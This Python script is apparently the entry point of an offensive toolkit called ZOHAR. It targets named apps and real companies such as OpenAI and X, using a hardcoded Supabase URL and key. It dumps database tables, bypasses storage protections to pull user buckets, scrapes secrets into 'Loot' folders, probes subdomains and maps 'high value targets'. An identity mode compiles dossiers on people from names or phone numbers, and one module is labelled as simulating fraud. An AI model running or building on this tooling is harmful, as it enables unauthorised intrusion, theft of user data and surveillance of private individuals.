import os
import sys
import argparse
import json

# Add current directory to path so we can import modules
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from modules.Aletheia import Aletheia
from modules.Azrael import Azrael
from modules.Archon import Archon
from modules.Anubis import Anubis
from modules.Oculus import Oculus
from modules.Canon import Canon
from modules.Hermes import Hermes
from modules.Hades import Hades
from modules.TheOracle import TheOracle
from modules.Raziel_API_Siphon import Raziel_API_Siphon
from modules.Oculus_Visualizer import Oculus_Visualizer
from Identity.phone_recon import PhoneTracer
from Identity.person_dossier import IdentityHunter
from Identity.god_mode import GodModeHunter
from Identity.html_reporter import IntelligenceReporter
from Identity.visualizer import NetworkGraphGenerator

# Default Configuration (Can be overridden by ENV or Args)
# Currently set to Bosley defaults as it's the active target
DEFAULT_URL = "https://jvlziovytepaojbzkjyp.supabase.co"
DEFAULT_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp2bHppb3Z5dGVwYW9qYnpranlwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgzMjkwNTEsImV4cCI6MjA4MzkwNTA1MX0.6mUmMH4JB5zBbJit0TCjK3jaNu2iwZyvDCEHY1gMtf0"

def banner():
    print("""
    ███████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗ 
    ╚══███╔╝██╔═══██╗██║  ██║██╔══██╗██╔══██╗
      ███╔╝ ██║   ██║███████║███████║██████╔╝
     ███╔╝  ██║   ██║██╔══██║██╔══██║██╔══██╗
    ███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    
    The OSINT Orchestrator
    Powered by: Aletheia, Azrael, Archon, Anubis
    Enforcing: THE CANON
    """)

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="ZOHAR: The OSINT Backend Core")
    parser.add_argument("--target", help="Target App (bosley, avven, aureon, axiom, openai)", default="bosley")
    parser.add_argument("--action", help="Action to perform (reveal, harvest, map, judge, siphon, all)", default="all")
    parser.add_argument("--rules", help="Display The Canon (mandatory rules)", action="store_true")
    parser.add_argument("--url", help="Supabase URL", default=DEFAULT_URL)
    parser.add_argument("--key", help="Supabase Anon Key", default=DEFAULT_KEY)
    
    # Identity Module Arguments
    parser.add_argument("--mode", help="Mode: infrastructure (default) or identity", default="infrastructure")
    parser.add_argument("--identity-type", help="Identity Type: phone or person", default="person")
    parser.add_argument("--query", help="Query for Identity Mode (Name or Phone Number)")
    parser.add_argument("--dob", help="Date of Birth (YYYY-MM-DD) for precision targeting")
    parser.add_argument("--location", help="Geographic location (City, State, Country) for verification")

    args = parser.parse_args()
    
    # IDENTITY MODE EXECUTION
    if args.mode == "identity":
        if not args.query:
            print("[!] Error: Identity mode requires --query (Name or Phone Number)")
            return

        print(f"[*] ZOHAR IDENTITY INTELLIGENCE MODULE ACTIVATED")
        print(f"[*] Target: {args.query}")
        
        reporter = IntelligenceReporter()
        visualizer = NetworkGraphGenerator()
        
        if args.identity_type == "phone":
            tracer = PhoneTracer()
            data = tracer.trace(args.query)
            reporter.generate_dossier(args.query, data, mode="phone")
            
        elif args.identity_type == "person":
            # Upgrade to God Mode for Person Search
            print("[*] Escalating privileges to GOD MODE...")
            hunter = GodModeHunter()
            data = hunter.execute_directive(args.query, dob=args.dob, location=args.location)
            
            # Generate Reports
            reporter.generate_dossier(args.query, data, mode="person", location=args.location)
            visualizer.generate_graph(args.query, data)
            
        else:
            print(f"[!] Unknown identity type: {args.identity_type}")
            
        return # Exit after identity task

    # Resolve Target Directories
    target_map = {
        "bosley": "Bosley",
        "avven": "Avven",
        "aureon": "Aureon",
        "axiom": "Axiom",
        "zorak": "Zorak_Corp",
        "openai": "OpenAI",
        "x": "X_Corp",
        "twitter": "X_Corp"
    }
    
    clean_target = target_map.get(args.target.lower(), "Bosley")
    
    # Define Base Paths (Assumes Zohar_Toolkit is sibling to Intelligence_Database)
    # Zohar_Toolkit/Zohar_Backend.py -> parent -> root -> Intelligence_Database
    root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    base_db = os.path.join(root_dir, "Intelligence_Database")
    
    loot_dir = os.path.join(base_db, clean_target, "Loot")
    report_dir = os.path.join(base_db, clean_target, "Reports")
    evidence_dir = os.path.join(base_db, clean_target, "Evidence")
    
    # Ensure dirs exist
    for d in [loot_dir, report_dir, evidence_dir]:
        if not os.path.exists(d):
            os.makedirs(d, exist_ok=True)

    # Initialize The Oracle (Shared Mind)
    oracle_db_path = os.path.join(base_db, "ORACLE_KNOWLEDGE_BASE.json")
    oracle = TheOracle(oracle_db_path)

    # Initialize Modules
    canon = Canon()
    
    # If explicitly asked for rules
    if args.rules:
        canon.preach()
        return

    # Initialize Tools
    target_urls = []
    
    # Initialize Hermes for subdomain discovery
    hermes = Hermes(oracle=oracle)
    hades = Hades(oracle=oracle)

    # Findings tracker for Compliance (Initialized early for use in discovery)
    findings_report = {
        "keys_found": False,
        "buckets_harvested": False,
        "history_recovered": False,
        "infrastructure_mapped": False, # Law 8
        "comms_scanned": False # Law 9
    }

    if args.target.lower() == "openai":
        print("[*] Initiating Hermes Protocol for Subdomain Discovery...")
        
        # 1. Passive Discovery via CT Logs
        subdomains = hermes.scout("openai.com")
        
        findings_report['infrastructure_mapped'] = True # Law 8 Compliance
        findings_report['subdomains_found'] = len(subdomains)
        
        # Save full list to Loot
        with open(os.path.join(loot_dir, "all_subdomains.txt"), "w") as f:
            f.write("\n".join(subdomains))
            
        # 2. Hades Deep Probe (The Underworld)
        # We take ALL subdomains, not just the filtered ones, and let Hades sort them out
        hades.torture(subdomains)
        
        # Save Alive Hosts
        alive_endpoints = oracle.get_alive_hosts()
        with open(os.path.join(loot_dir, "hades_alive_endpoints.json"), "w") as f:
            json.dump(alive_endpoints, f, indent=2)
            
        # 3. Use Alive Targets from Oracle for Deep Scan
        target_urls = alive_endpoints
            
        # Ensure critical targets are always present (even if blocked, we try Oculus on them)
        mandatory_targets = [
            "https://openai.com",
            "https://chat.openai.com",
            "https://platform.openai.com",
            "https://help.openai.com"
        ]
        target_urls.extend(mandatory_targets)
        target_urls = list(set(target_urls))
        
        print(f"[*] Identified {len(target_urls)} priority targets for Deep Scan (from Oracle).")

    elif args.target.lower() in ["x", "twitter"]:
        print("[*] Initiating Hermes Protocol for X Corp...")
        
        # 1. Passive Discovery
        subdomains = hermes.scout("twitter.com") # Legacy domain often has more surface area
        subdomains_x = hermes.scout("x.com")
        subdomains.extend(subdomains_x)
        subdomains = list(set(subdomains))
        
        findings_report['infrastructure_mapped'] = True
        findings_report['subdomains_found'] = len(subdomains)
        
        with open(os.path.join(loot_dir, "all_subdomains.txt"), "w") as f:
            f.write("\n".join(subdomains))
            
        # 2. Hades Deep Probe
        hades.torture(subdomains)
        
        # Save Alive Hosts
        alive_endpoints = oracle.get_alive_hosts()
        with open(os.path.join(loot_dir, "hades_alive_endpoints.json"), "w") as f:
            json.dump(alive_endpoints, f, indent=2)
            
        target_urls = alive_endpoints
        
        mandatory_targets = [
            "https://x.com",
            "https://twitter.com",
            "https://api.twitter.com",
            "https://developer.twitter.com"
        ]
        target_urls.extend(mandatory_targets)
        target_urls = list(set(target_urls))
        print(f"[*] Identified {len(target_urls)} priority targets for Deep Scan.")

        
    else:
        target_urls = [f"https://{clean_target.lower()}.app/dashboard"]

    aletheia = Aletheia(args.url, args.key)
    azrael = Azrael(args.url, args.key)
    archon = Archon()
    anubis = Anubis()
    
    print(f"[*] Target System: {clean_target}")
    print(f"[*] Database Path: {loot_dir}")
    print(f"[*] Supabase URL:  {args.url}")
    
    # Execution Logic
    if args.action in ["scan", "all"]:
        all_js_data = {"keys": []}
        
        for url in target_urls:
            print(f"\n[*] Scanning Target URL: {url}")
            oculus = Oculus(url, oracle=oracle)
            js_data = oculus.gaze()
            
            # Merge findings
            if js_data.get('keys'):
                all_js_data['keys'].extend(js_data['keys'])
                for k, v in js_data.items():
                    if k != 'keys':
                        if k not in all_js_data: all_js_data[k] = []
                        all_js_data[k].extend(v)

        if all_js_data.get('keys'):
            findings_report['keys_found'] = True
            # Deduplicate
            all_js_data['keys'] = list(set(all_js_data['keys']))
            
            with open(os.path.join(loot_dir, "oculus_secrets.json"), "w") as f:
                json.dump(all_js_data, f, indent=2)

    if args.action in ["siphon", "all"]:
        print(f"\n[*] Unleashing RAZIEL (The Siphon) on {len(target_urls)} targets...")
        raziel_out = os.path.join(base_db, clean_target, "Raziel_Reports")
        if not os.path.exists(raziel_out):
            os.makedirs(raziel_out)
            
        for url in target_urls:
            print(f"[*] Raziel Targeting: {url}")
            try:
                raziel = Raziel_API_Siphon(url, output_dir=raziel_out)
                raziel.run()
                findings_report['dual_records_kept'] = True # Law 6 Compliance
                findings_report['source_code_scanned'] = True # Law 7 Compliance
                findings_report['source_repos_found'] = len(raziel.source_repos_found)
                findings_report['comms_scanned'] = True # Law 9 Compliance
                findings_report['comms_found'] = len(raziel.comms_channels_found)
            except Exception as e:
                print(f"[!] Raziel failed on {url}: {e}")

    # Supabase Specific Modules (Skip for OpenAI)
    if clean_target != "OpenAI":
        if args.action in ["reveal", "all"]:
            # Aletheia: Dump tables
            # We now delegate to the module's reveal_all for comprehensive coverage
            aletheia.reveal_all()
            findings_report['history_recovered'] = True # Assuming success
            
            # Legacy support for specific checks if needed
            # tables = ["post_edits", "post_likes", "follows", "topics", "profiles"]
            # for t in tables:
            #    data = aletheia.reveal(t, output_dir=loot_dir)

        if args.action in ["harvest", "all"]:
            # Azrael: Storage Bypass
            buckets = ["avatars", "chat-attachments", "posts"] # Common buckets
            for b in buckets:
                azrael.reap(b, output_dir=os.path.join(loot_dir, b.title()))
                findings_report['buckets_harvested'] = True # Assuming at least attempted

        if args.action in ["map", "all"]:
            # Archon: Cross reference
            
            # We try to find the users file in the investigation folder first, or fall back to loot
            # Legacy path: Zohar_Toolkit/bosley_investigation/all_known_users.json
            # New path might be: Intelligence_Database/Bosley/Loot/all_known_users.json
            
            legacy_users_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bosley_investigation", "all_known_users.json")
            loot_users_file = os.path.join(loot_dir, "all_known_users.json")
            
            users_file = legacy_users_file if os.path.exists(legacy_users_file) else loot_users_file
            
            follows_file = os.path.join(loot_dir, "aletheia_follows_dump.json")
            
            # We need a source of "External UUIDs" to map against. 
            # For demo, we use the hardcoded ones from the Avven investigation
            avven_targets = [
                "07e682a8-cb75-47cf-a03d-eda8b64a7c2c",
                "57ebfc0d-bd65-4449-8f04-66b9d0b774d7"
            ]
            
            if os.path.exists(follows_file):
                matches = archon.map_identities(users_file, follows_file, avven_targets)
                
                # Save Matches
                with open(os.path.join(loot_dir, "identity_matches.json"), "w") as f:
                    json.dump(matches, f, indent=2)
                    
                # Save HVTs
                if hasattr(archon, 'hvt_list') and archon.hvt_list:
                    with open(os.path.join(loot_dir, "high_value_targets.json"), "w") as f:
                        json.dump(archon.hvt_list, f, indent=2)
                    print(f"[+] Saved {len(archon.hvt_list)} High Value Targets to loot.")
            else:
                print(f"[-] Follows file not found at {follows_file}. Run 'reveal' first.")
    else:
        print("\n[ZOHAR] Skipping Supabase Modules (Aletheia, Azrael, Archon) for Non-Supabase Target: OpenAI")
        
    if args.action in ["judge", "all"]:
        # Anubis: Simulate fraud
        # Only applicable to Financial/Trading targets (Axiom)
        if clean_target.lower() in ["axiom"]:
            anubis.judge("DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", 1.0, 10.0)
        else:
            print(f"\n[ANUBIS] Skipping Financial Judgment. Target '{clean_target}' is not a trading platform.")

    # --- VISUALIZATION (Law 250) ---
    print("\n[*] Initializing The Architect's Canvas (Law 250)...")
    try:
        visualizer = Oculus_Visualizer(report_dir)
        
        # Build Graph Data
        nodes = [clean_target]
        edges = []
        
        # Add targets as nodes
        if 'target_urls' in locals():
            for url in target_urls:
                # Truncate long URLs for display
                short_url = url.replace("https://", "").split('/')[0]
                # If it's a file path or long route, simplify
                if len(short_url) > 30: short_url = short_url[:27] + "..."
                
                nodes.append(short_url)
                edges.append((clean_target, short_url))
        
        # Add Secrets
        if 'all_js_data' in locals() and all_js_data.get('keys'):
             secret_node = f"SECRETS_FOUND_({len(all_js_data['keys'])})"
             nodes.append(secret_node)
             edges.append((clean_target, secret_node))
        
        # Add Subdomains
        if 'subdomains' in locals() and subdomains:
            sub_node = f"SUBDOMAINS_({len(subdomains)})"
            nodes.append(sub_node)
            edges.append((clean_target, sub_node))
            
        # Add Alive Hosts
        if 'alive_endpoints' in locals() and alive_endpoints:
            alive_node = f"ALIVE_HOSTS_({len(alive_endpoints)})"
            nodes.append(alive_node)
            edges.append((clean_target, alive_node))

        map_path = visualizer.draw_map(nodes, edges, title=f"{clean_target} Attack Surface Map")
        print(f"[*] Visual Workflow Diagram built: {map_path}")
    except Exception as e:
        print(f"[!] Visualization failed: {e}")

    # Final Compliance Check
    canon.verify_compliance(findings_report)

    print("\n[ZOHAR] Operation Complete.")

if __name__ == "__main__":
    main()
